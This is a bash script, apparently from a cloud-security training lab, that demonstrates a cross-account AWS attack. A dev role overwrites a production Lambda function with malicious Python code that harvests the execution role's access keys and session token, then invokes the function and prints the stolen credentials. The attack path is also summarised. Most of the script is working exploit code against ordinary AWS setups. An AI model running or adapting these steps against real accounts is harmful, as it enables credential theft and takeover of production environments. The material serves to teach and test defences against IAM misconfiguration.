#!/bin/bash

# Cross-Account Lambda Function Code Update Attack Demo
# This script demonstrates how a dev role can update and invoke a prod Lambda function
# to extract credentials from the Lambda execution role


# Disable AWS CLI paging
export AWS_PAGER=""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Dim color for command display
DIM='\033[2m'
CYAN='\033[0;36m'

# Track attack commands for summary
ATTACK_COMMANDS=()

# Display a command before executing it
show_cmd() {
    local identity="$1"; shift
    echo -e "${DIM}[${identity}] \$ $*${NC}"
}

# Display AND record an attack command
show_attack_cmd() {
    local identity="$1"; shift
    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
    ATTACK_COMMANDS+=("$*")
}

echo -e "${BLUE}=== Cross-Account Lambda Function Code Update Attack Demo ===${NC}"
echo "This demo shows how a dev role can update and invoke a prod Lambda function"
echo "to extract credentials from the Lambda execution role."
echo ""

# Check if AWS CLI is configured
if ! command -v aws &> /dev/null; then
    echo -e "${RED}Error: AWS CLI is not installed or not in PATH${NC}"
    exit 1
fi

# Check if we have the required profile
if ! aws sts get-caller-identity --profile pl-pathfinding-starting-user-dev &> /dev/null; then
    echo -e "${RED}Error: AWS profile 'pl-pathfinding-starting-user-dev' not found${NC}"
    echo "Please configure the profile first."
    exit 1
fi

# Retrieve readonly credentials for observation steps
cd ../../../../../..  # Navigate to root of terraform project
READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)

if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
    exit 1
fi

echo "ReadOnly Key ID: ${READONLY_ACCESS_KEY:0:10}..."
cd - > /dev/null

# Credential switching helpers
use_readonly_creds() {
    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
    unset AWS_SESSION_TOKEN
}
use_starting_profile() {
    unset AWS_ACCESS_KEY_ID
    unset AWS_SECRET_ACCESS_KEY
    unset AWS_SESSION_TOKEN
}

echo -e "${GREEN}✓ Retrieved readonly credentials from Terraform${NC}"
echo ""

# [EXPLOIT] Step 1: Assume the dev Lambda invoke role
echo -e "${YELLOW}Step 1: Assuming dev Lambda invoke role${NC}"
DEV_ROLE_ARN=$(aws sts get-caller-identity --profile pl-pathfinding-starting-user-dev --query 'Account' --output text)
DEV_ROLE_ARN="arn:aws:iam::${DEV_ROLE_ARN}:role/pl-dev-lambda-invoke-role"

echo "Assuming role: $DEV_ROLE_ARN"

show_attack_cmd "Attacker" "aws sts assume-role --profile pl-pathfinding-starting-user-dev --role-arn \"$DEV_ROLE_ARN\" --role-session-name \"lambda-attack-demo\" --output json"
TEMP_CREDS=$(aws sts assume-role \
    --profile pl-pathfinding-starting-user-dev \
    --role-arn "$DEV_ROLE_ARN" \
    --role-session-name "lambda-attack-demo" \
    --output json)

if [ $? -ne 0 ]; then
    echo -e "${RED}Error: Failed to assume dev role${NC}"
    exit 1
fi

# Extract assumed-role credentials (do NOT replace with helper - these are session token creds)
export AWS_ACCESS_KEY_ID=$(echo $TEMP_CREDS | jq -r '.Credentials.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $TEMP_CREDS | jq -r '.Credentials.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $TEMP_CREDS | jq -r '.Credentials.SessionToken')
export AWS_DEFAULT_REGION="us-west-2"

echo -e "${GREEN}✓ Successfully assumed dev Lambda invoke role${NC}"
echo ""

# [OBSERVATION] Step 2: Get the prod Lambda function ARN
echo -e "${YELLOW}Step 2: Getting prod Lambda function name and account ID${NC}"
use_readonly_creds
show_cmd "ReadOnly" "aws sts get-caller-identity --query 'Account' --output text"
PROD_ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
show_cmd "ReadOnly" "aws lambda list-functions --query \"Functions[?starts_with(FunctionName, 'pl-prod-hello-world-')].FunctionName\" --output text"
LAMBDA_FUNCTION_NAME=$(aws lambda list-functions --query "Functions[?starts_with(FunctionName, 'pl-prod-hello-world-')].FunctionName" --output text | head -1)

if [ -z "$LAMBDA_FUNCTION_NAME" ]; then
    echo -e "${RED}Error: Could not find prod Lambda function${NC}"
    exit 1
fi

# Construct the full ARN for cross-account access
LAMBDA_FUNCTION_ARN="arn:aws:lambda:us-west-2:${PROD_ACCOUNT_ID}:function:${LAMBDA_FUNCTION_NAME}"
echo "Found function: $LAMBDA_FUNCTION_NAME"
echo "Full ARN: $LAMBDA_FUNCTION_ARN"
echo -e "${GREEN}✓ Retrieved prod Lambda function details${NC}"
echo ""

# Re-activate assumed dev role credentials for exploit steps
export AWS_ACCESS_KEY_ID=$(echo $TEMP_CREDS | jq -r '.Credentials.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $TEMP_CREDS | jq -r '.Credentials.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $TEMP_CREDS | jq -r '.Credentials.SessionToken')

# [EXPLOIT] Step 3: Create malicious code zip
echo -e "${YELLOW}Step 3: Creating malicious Lambda code${NC}"
MALICIOUS_ZIP="/tmp/malicious_lambda.zip"

# Create malicious code with the same filename as original
cat > /tmp/hello_world.py << 'EOF'
import boto3
import json
import urllib3
import os

def lambda_handler(event, context):
    """
    Malicious Lambda function that extracts credentials and sends them to attacker
    """

    # Get the Lambda execution role credentials
    session = boto3.Session()
    credentials = session.get_credentials()

    # Extract credential information
    cred_data = {
        'access_key_id': credentials.access_key,
        'secret_access_key': credentials.secret_key,
        'session_token': credentials.token,
        'region': session.region_name,
        'function_name': context.function_name,
        'function_arn': context.invoked_function_arn,
        'account_id': context.invoked_function_arn.split(':')[4]
    }

    # In a real attack, this would send to attacker's server
    # For demo purposes, we'll just return the credentials

    return {
        'statusCode': 200,
        'body': json.dumps({
            'message': 'Credentials extracted successfully',
            'credentials': cred_data,
            'warning': 'This is a demonstration of credential extraction via Lambda function code update'
        })
    }
EOF

# Create zip file
cd /tmp
zip -q malicious_lambda.zip hello_world.py
echo -e "${GREEN}✓ Created malicious Lambda code${NC}"
echo ""

# [EXPLOIT] Step 4: Update the Lambda function code
echo -e "${YELLOW}Step 4: Updating prod Lambda function with malicious code${NC}"
echo "Target function: $LAMBDA_FUNCTION_NAME"
echo "Using ARN: $LAMBDA_FUNCTION_ARN"

show_attack_cmd "Attacker" "aws lambda update-function-code --function-name \"$LAMBDA_FUNCTION_ARN\" --zip-file \"fileb://malicious_lambda.zip\""
aws lambda update-function-code \
    --function-name "$LAMBDA_FUNCTION_ARN" \
    --zip-file "fileb://malicious_lambda.zip"

if [ $? -eq 0 ]; then
    echo -e "${GREEN}✓ Successfully updated Lambda function with malicious code${NC}"
else
    echo -e "${RED}Error: Failed to update Lambda function${NC}"
    exit 1
fi
echo ""

# [EXPLOIT] Step 5: Invoke the malicious function
echo -e "${YELLOW}Step 5: Invoking malicious Lambda function to extract credentials${NC}"

show_attack_cmd "Attacker" "aws lambda invoke --function-name \"$LAMBDA_FUNCTION_ARN\" --payload '{}' /tmp/lambda_response.json"
RESPONSE=$(aws lambda invoke \
    --function-name "$LAMBDA_FUNCTION_ARN" \
    --payload '{}' \
    /tmp/lambda_response.json)

if [ $? -eq 0 ]; then
    echo -e "${GREEN}✓ Successfully invoked malicious Lambda function${NC}"
    echo ""
    echo -e "${CYAN}EXTRACTED CREDENTIALS:${NC}"
    echo "========================"
    cat /tmp/lambda_response.json | jq -r '.body' | jq .
else
    echo -e "${RED}Error: Failed to invoke Lambda function${NC}"
    exit 1
fi
echo ""

# [OBSERVATION] Step 6: Demonstrate the impact
echo -e "${YELLOW}Step 6: Attack summary${NC}"
echo "The extracted credentials can now be used to:"
echo "- Access any AWS service in the prod account"
echo "- Assume any role the Lambda execution role can assume"
echo "- Perform administrative actions in the prod account"
echo ""
echo -e "${RED}Warning: This demonstrates a critical cross-account privilege escalation vulnerability!${NC}"

# Cleanup
echo ""
echo "Cleaning up temporary files..."
rm -f /tmp/malicious_lambda.py /tmp/malicious_lambda.zip /tmp/lambda_response.json

if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
    echo -e "\n${YELLOW}Attack Commands:${NC}"
    for cmd in "${ATTACK_COMMANDS[@]}"; do
        echo -e "  ${CYAN}\$ ${cmd}${NC}"
    done
fi

echo ""
echo -e "${GREEN}=== Attack Demonstration Complete ===${NC}"
echo "The prod Lambda function now contains malicious code that can extract credentials."
echo ""
echo -e "${YELLOW}Attack Path:${NC}"
echo "  pl-pathfinding-starting-user-dev"
echo "  → (sts:AssumeRole) → pl-dev-lambda-invoke-role"
echo "  → (lambda:UpdateFunctionCode) → update prod Lambda with malicious code"
echo "  → (lambda:InvokeFunction) → extract Lambda execution role credentials"

# Mark demo as active for plabs tracking
touch "$(dirname "$0")/.demo_active"
